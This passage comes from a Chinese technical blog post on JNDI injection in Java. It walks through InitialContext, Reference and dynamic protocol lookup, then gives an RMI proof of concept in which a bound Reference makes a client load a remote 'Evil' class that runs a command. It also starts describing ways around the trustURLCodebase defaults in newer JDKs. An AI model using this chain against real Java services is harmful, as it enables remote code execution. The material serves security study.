style="color:#000000;">javax.naming.event，在命名目录服务器中请求事件通知</font></li><li><font style="color:#000000;">javax.naming.ldap，提供LDAP服务支持</font></li><li><font style="color:#000000;">javax.naming.spi，允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务</font></li></ol><h3 id="InitialContext"><a href="#InitialContext" class="headerlink" title="InitialContext"></a>InitialContext</h3><p><font style="color:#000000;">InitialContext类是JNDI的一个核心类，实现了Context接口，是所有命名操作的起点。它提供了一个上下文环境，用于相对命名操作。</font></p><p>构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Constructs an initial context.</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InitialContext</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    init(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs an initial context with the option of not initializing it.</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">InitialContext</span><span class="params">(<span class="type">boolean</span> lazy)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (!lazy) &#123;</span><br><span class="line">        init(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs an initial context using the supplied environment.</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InitialContext</span><span class="params">(Hashtable&lt;?,?&gt; environment)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (environment != <span class="literal">null</span>) &#123;</span><br><span class="line">        environment = (Hashtable)environment.clone();</span><br><span class="line">    &#125;</span><br><span class="line">    init(environment);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleInitialContextDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;dns://a952d10bd0.ipv6.1433.eu.org&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">            ctx.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><font style="color:#000000;">Reference类也是在javax.naming的一个类，实现了Referenceable接口，用于表示对对象的引用。该类表示对在命名&#x2F;目录系统外部找到的对象的引用，它包含了对象的类名和一组属性，这些属性描述了如何创建和查找对象。</font></p><p>构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">className – The non-null class name of the object to which this reference refers.</span></span><br><span class="line"><span class="comment">addr – The non-null address of the object.</span></span><br><span class="line"><span class="comment">factory – The possibly null class name of the object&#x27;s factory.</span></span><br><span class="line"><span class="comment">factoryLocation – The possibly null location from which to load the factory (e. g. URL)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs a new reference for an object with class name &#x27;className&#x27;.</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Reference</span><span class="params">(String className)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.className  = className;</span><br><span class="line">    addrs = <span class="keyword">new</span> <span class="title class_">Vector</span>&lt;&gt;();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs a new reference for an object with class name &#x27;className&#x27; and an address.</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Reference</span><span class="params">(String className, RefAddr addr)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.className = className;</span><br><span class="line">    addrs = <span class="keyword">new</span> <span class="title class_">Vector</span>&lt;&gt;();</span><br><span class="line">    addrs.addElement(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs a new reference for an object with class name &#x27;className&#x27;, and the class name and location of the object&#x27;s factory.</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(className);</span><br><span class="line">    classFactory = factory;</span><br><span class="line">    classFactoryLocation = factoryLocation;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs a new reference for an object with class name &#x27;className&#x27;, the class name and location of the object&#x27;s factory, and the address for the object.</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Reference</span><span class="params">(String className, RefAddr addr, String factory, String factoryLocation)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(className, addr);</span><br><span class="line">    classFactory = factory;</span><br><span class="line">    classFactoryLocation = factoryLocation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleReferenceDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;a&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p><font style="color:#000000;">以上文中InitialContext为例：</font></p><p><font style="color:#000000;">首先，使用Hashtable类来设置属性INITIAL_CONTEXT_FACTORY和PROVIDER_URL的值，初始化了一个上下文。</font></p><p><font style="color:#000000;">接着，定义了两个环境值，一个是INITIAL_CONTEXT_FACTORY，值为com.sun.jndi.dns.DnsContextFactoryDnsContext的工厂类，同时，INITIAL_CONTEXT_FACTORY也决定了JNDI上下文的实际协议；一个是PROVIDER_URL，值为DNS服务器的URL地址。</font></p><p><font style="color:#000000;">最后，实例化InitialContext类并将设置好的属性值传入来初始化一个Context，此时便获得了一个与DNS服务相关联的上下文Context。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleInitialContextDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;dns://a952d10bd0.ipv6.1433.eu.org&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">            ctx.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体流程如下：</p><p>在<font style="color:#000000;">实例化InitialContext类处下断点，跟进javax.naming.InitialContext#InitialContext方法，通过传入的属性值进行初始化操作。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730773370535-9d94ca1f-65a4-4a60-b503-4d41d54bb8af.png"></p><p>跟进init方法，调用javax.naming.InitialContext#getDefaultInitCtx方法。</p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730774698222-529a353e-ee84-49a0-bfd6-f41233d9cd0f.png"></p><p><font style="color:#000000;">跟进getDefaultInitCtx方法，调用javax.naming.spi.NamingManager#getInitialContext方法。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730774739134-93bfd43a-e8ea-4b0c-bfea-2aebafc81352.png"></p><p><font style="color:#000000;">跟进getInitialContext方法，先调用getInitialContextFactoryBuilder方法初始化了一个InitialContextFactoryBuilder类，如果initctx_factory_builder为null，则将className设置为INITIAL_CONTEXT_FACTORY属性，即手动设置的DNS上下文工厂类com.sun.jndi.dns.DnsContextFactory。</font></p><p><font style="color:#000000;">接着，通过loadClass方法来动态加载设置的工厂类，最终调用Rcom.sun.jndi.dns.DnsContextFactory#getInitialContext方法，通过设置工厂类来初始化上下文Context。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730775227588-4e3fcf79-572d-452e-861a-fb5be405db70.png"></p><p><font style="color:#000000;">跟进DnsContextFactory#getInitialContext方法，该处的var1的值为设置的环境变量。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730775670222-2845bde1-fc26-43eb-9509-9489d0283f55.png"></p><p><font style="color:#000000;">跟进com.sun.jndi.dns.DnsContextFactory#getInitCtxUrl方法，通过java.naming.provider.url的值来获取服务的路径。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730775808278-aa881e17-7879-44a4-a456-67271cf5f3c9.png"></p><p><font style="color:#000000;">最终初始化了一个DnsContext，获取了与服务交互所需的资源，接着通过获取到的资源与服务进行交互。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730776036618-dacf448e-7627-4ae5-a3c5-4887d629dc50.png"></p><h2 id="动态协议转换"><a href="#动态协议转换" class="headerlink" title="动态协议转换"></a>动态协议转换</h2><p><font style="color:#000000;">在上文分析的示例代码，通过手动设置属性INITIAL_CONTEXT_FACTORY和PROVIDER_URL的值来初始化上下文。实际上，在Context#lookup方法的参数中，可以指定查找协议，JNDI会通过用户的输入来动态的识别要调用的服务以及路径。</font></p><p><font style="color:#000000;">示例代码如下：</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RmiDemo</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RmiDemo</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RmiDemoImpl</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiDemoImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RmiDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RmiDemoImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;RMI Called...&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SimpleRmiDemo</span></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleRmiDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">rmiUrl</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/hello&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RmiDemo</span> <span class="variable">rmiDemo</span> <span class="operator">=</span> (RmiDemo) initialContext.lookup(rmiUrl);</span><br><span class="line">        rmiDemo.hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在调用lookup方法处下断点，跟进javax.naming.InitialContext#lookup方法。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730790710373-709068ed-474c-48e9-aa63-7cd6ae9f32a9.png"></p><p><font style="color:#000000;">继续跟进javax.naming.InitialContext#getURLOrDefaultInitCtx方法，会调用javax.naming.InitialContext#getURLScheme方法解析出使用的协议，接着传入javax.naming.spi.NamingManager#getURLContext方法，根据defaultPkgPrefix属性动态生成Factory类，根据协议获取对应的Context。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730791193512-ba41d5a1-0e0f-4c83-b5ef-a84dce95af0e.png"></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730791784814-cf16b8d5-75a1-42ed-9ad2-c28ca41a1fc1.png"></p><p><font style="color:#000000;">通过动态协议转换，可以仅通过一串特定字符串就指定JNDI调用何种服务，十分便捷。但是，在示例代码中，假如能够控制rmiUrl字段，那么就可以搭建恶意服务，并控制JNDI接口访问该恶意，于是将导致恶意的远程class文件加载，从而导致远程代码执行。这种攻击手法其实就是JNDI注入，它和RMI服务攻击手法中的“远程加载CodeBase”较为类似，都是通过一些远程通信来引入恶意的class文件，进而导致代码执行。</font></p><p><font style="color:#000000;">JNDI默认支持的动态协议转换有如下几种，针对JNDI进行攻击的时候可以优先考虑以下几种服务。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730792164188-a91dbed9-9b3a-479a-b563-628f9659fd8f.png"></p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p><font style="color:#000000;">在上文的工作流程分析中可以看到，当传入lookup函数的参数控制不当时，则有可能导致加载远程恶意类，JNDI攻击流程如下图所示。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730798860672-8c232961-73eb-436a-8cd0-658fa7aaab0b.png"></p><p><font style="color:#000000;">对于JNDI注入，在后续的JDK版本中对于RMI&#x2F;LDAP两个攻击方式都做了默认情况的限制。</font></p><ol><li><font style="color:#000000;">RMI：</font><strong><font style="color:#000000;">从JDK 6u132、7u122、8u113及更高版本开始，com.sun.jndi.rmi.object.trustURLCodebase的默认值为false</font></strong><font style="color:#000000;">，它可以防止通过JNDI获取的RMI对象从远程提供的代码库URL自动加载类定义。</font></li></ol><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730799507237-b672b9fe-e77e-43fc-8b2d-12984989e860.webp.png"></p><ol start="2"><li><font style="color:#000000;">LDAP：</font><strong><font style="color:#000000;">从JDK 6u211、7u201、11.0.1、8u191及更高版本开始，com.sun.jndi.ldap.object.trustURLCodebase的默认值为false</font></strong><font style="color:#000000;">，禁用从远程位置自动加载通过JNDI中的LDAP服务检索对象的Java类定义。</font></li></ol><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730799589786-b7121d5b-56c5-481c-9fee-fd590e0cdb68.webp.png"></p><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><h4 id="低版本JDK"><a href="#低版本JDK" class="headerlink" title="低版本JDK"></a>低版本JDK</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Server Code</span></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">factoryUrl</span> <span class="operator">=</span> <span class="string">&quot;http://localhost:8080/&quot;</span>;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Evil&quot;</span>, <span class="string">&quot;Evil&quot;</span>, factoryUrl);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line"></span><br><span class="line">        registry.bind(<span class="string">&quot;calc&quot;</span>, referenceWrapper);</span><br><span class="line">        System.err.println(<span class="string">&quot;RMI Server Ready: &quot;</span> + factoryUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Client Code</span></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RmiClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">rmiUrl</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/calc&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(rmiUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Evil Code</span></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730807053979-5547cd13-cfde-4387-938e-ddecf08d2262.png"></p><h4 id="高版本JDK"><a href="#高版本JDK" class="headerlink" title="高版本JDK"></a>高版本JDK</h4><p><font style="color:#000000;">在高版本运行Client代码时会抛出如下异常，上文也提到了，从JDK 6u132、7u122、8u113及更高版本开始，com.sun.jndi.rmi.object.trustURLCodebase的默认值为false，它可以防止通过JNDI获取的RMI对象从远程提供的代码库URL自动加载类定义。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> javax.naming.ConfigurationException: The object factory is untrusted. Set the system property <span class="string">&#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27;</span> to <span class="string">&#x27;true&#x27;</span>.</span><br><span class="line">at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:<span class="number">495</span>)</span><br><span class="line">at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:<span class="number">138</span>)</span><br><span class="line">at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:<span class="number">217</span>)</span><br><span class="line">at javax.naming.InitialContext.lookup(InitialContext.java:<span class="number">417</span>)</span><br><span class="line">at org.example.jndi.RmiClient.main(RmiClient.java:<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">那么有什么方式可以绕过该限制嘛？答案显然是有的，在抛出的异常中可以看到，高版本JDK无法加载远程代码是在com.sun.jndi.rmi.registry.RegistryContext#decodeObject方法中出现问题。</font></p><p><font style="color:#000000;">进入异常抛出的逻辑语句的前提是满足</font><strong><font style="color:#000000;background-color:#ffffff;">var8 !&#x3D; null &amp;&amp; var8.getFactoryClassLocation() !&#x3D; null &amp;&amp; !trustURLCodebase</font></strong><font style="color:#000000;background-color:#ffffff;">，那么为了绕过ConfigurationException的限制，可以从三个角度出发，即令var &#x3D;&#x3D; null，或者令var8.getFactoryClassLocation() &#x3D;&#x3D; null，或者令trustURLCodebase的值为true。</font></p><ol><li><font style="color:#000000;">方法一：令var8为null，从语义上看需要var3既不是Reference也不是Referenceable。即，不能是对象引用，只能是原始对象，这时候客户端直接实例化本地对象，远程RMI没有操作的空间，因此这种情况不太好利用。</font></li><li><font 